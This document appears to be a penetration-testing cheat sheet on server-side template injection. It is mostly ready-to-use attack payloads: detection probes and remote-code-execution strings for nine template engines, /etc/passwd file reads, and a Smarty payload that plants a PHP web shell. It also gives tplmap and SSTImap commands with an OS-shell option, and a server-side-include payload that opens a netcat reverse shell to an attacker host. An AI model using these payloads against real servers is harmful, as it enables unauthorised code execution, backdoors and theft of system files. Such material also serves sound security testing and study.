# Server-Side Template Injection (SSTI)

## Table of Contents

- [Detection](#detection)
- [Template Engines](#template-engines)
  - [Jinja2 (Python)](#jinja2-python)
  - [Twig (PHP)](#twig-php)
  - [Freemarker (Java)](#freemarker-java)
  - [Velocity (Java)](#velocity-java)
  - [Smarty (PHP)](#smarty-php)
  - [Mako (Python)](#mako-python)
  - [Tornado (Python)](#tornado-python)
  - [Jade/Pug (Node.js)](#jadepug-nodejs)
  - [ERB (Ruby)](#erb-ruby)
- [Automation](#automation)

---

## Detection

### Basic Test Payloads

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
```

### Detection Flow

1. Inject math operation: `{{7*7}}`
2. If output is `49` â†’ Likely vulnerable
3. If output is `{{7*7}}` â†’ Not vulnerable or different syntax
4. Try other syntaxes: `${7*7}`, `<%= 7*7 %>`

### Template Engine Identification

| Payload | Jinja2/Twig | Smarty | Freemarker | Velocity |
| :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | 49 | 49 | 49 | - |
| `${7*7}` | - | - | 49 | 49 |
| `{{7*'7'}}` | 7777777 | 49 | Error | - |
| `<%= 7*7 %>` | - | - | - | - (ERB) |

---

## Template Engines

### Jinja2 (Python)

#### Jinja2 Detection

```jinja2
{{7*7}}
{{7*'7'}}
{{config.items()}}
```

#### Read Config

```jinja2
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Jinja2 RCE Payloads

```jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__base__.__subclasses__()}}
```

```jinja2
# Note: Index [408] varies by Python version - find subprocess.Popen with:
# {{''.__class__.__mro__[1].__subclasses__()}} then search for Popen
{{''.__class__.__mro__[1].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate()}}
```

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```jinja2
{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Flask-Specific

```jinja2
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Dump All Classes

```jinja2
{{ [].__class__.__base__.__subclasses__() }}
```

### Twig (PHP)

#### Twig Detection

```twig
{{7*7}}
{{7*'7'}}
{{_self.env.display("TEST")}}
```

#### Read File

```twig
{{"/etc/passwd"|file_excerpt(1,30)}}
```

#### Twig RCE Payloads

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```twig
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
```

```twig
{{app.request.server.all|join(',')}}
```

### Freemarker (Java)

#### Freemarker Detection

```java
${7*7}
<#assign x = 7*7>${x}
```

#### Freemarker RCE Payloads

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

```java
${"freemarker.template.utility.Execute"?new()("id")}
```

```java
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
```

### Velocity (Java)

#### Velocity Detection

```java
#set($x = 7*7)${x}
$class
```

#### Velocity RCE Payloads

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

### Smarty (PHP)

#### Smarty Detection

```php
{$smarty.version}
{7*7}
```

#### Smarty RCE Payloads

```php
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Mako (Python)

#### Mako Detection

```python
${7*7}
```

#### Mako RCE Payloads

```python
<%import os; x=os.popen('id').read() %>${x}
```

```python
${self.module.cache.util.os.popen('id').read()}
```

### Tornado (Python)

#### Tornado Detection

```python
{{7*7}}
```

#### Tornado RCE Payloads

```python
{% import os %}{{os.system('id')}}
{% import os %}{{os.popen('id').read()}}
```

### Jade/Pug (Node.js)

#### Pug Detection

```javascript
#{7*7}
```

#### Pug RCE Payloads

```javascript
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

### ERB (Ruby)

#### ERB Detection

```ruby
<%= 7*7 %>
```

#### ERB RCE Payloads

```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

---

## Automation

### tplmap

> <https://github.com/epinna/tplmap>

```shell
# Basic usage
python tplmap.py -u 'http://$rhost/page?name=test'

# POST request
python tplmap.py -u 'http://$rhost/page' --data 'name=test'

# OS Shell
python tplmap.py -u 'http://$rhost/page?name=test' --os-shell
```

### SSTImap

> <https://github.com/vladko312/SSTImap>

```shell
python sstimap.py -u 'http://$rhost/page?name=test'
python sstimap.py -u 'http://$rhost/page?name=test' -e Jinja2
```

---

## SSI Injection

### SSI Detection

```html
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
```

### RCE

```html
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### Reverse Shell

```html
<!--#exec cmd="mkfifo /tmp/foo;nc $lhost $lport 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

---

## Payload Cheat Sheet

| Engine | Detection | RCE |
| :--- | :--- | :--- |
| Jinja2 | `{{7*'7'}}` â†’ `7777777` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig | `{{7*'7'}}` â†’ `49` | `{{['id']\|filter('system')}}` |
| Freemarker | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | `#set($x = 7*7)${x}` | Runtime.getRuntime().exec() |
| Smarty | `{$smarty.version}` | `{system('id')}` |
| Mako | `${7*7}` | `<%import os; x=os.popen('id').read() %>${x}` |
| Tornado | `{{7*7}}` | `{% import os %}{{os.popen('id').read()}}` |
| ERB | `<%= 7*7 %>` | `<%= system("id") %>` |

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[Command Injection](7.4.Command-Injection.md)** - OS command execution
- **[SSRF](7.5.SSRF.md)** - Server-Side Request Forgery

### Reverse Shell & Post-Exploitation

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Shell payloads after SSTI exploitation
- **[Privilege Escalation Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - After initial access
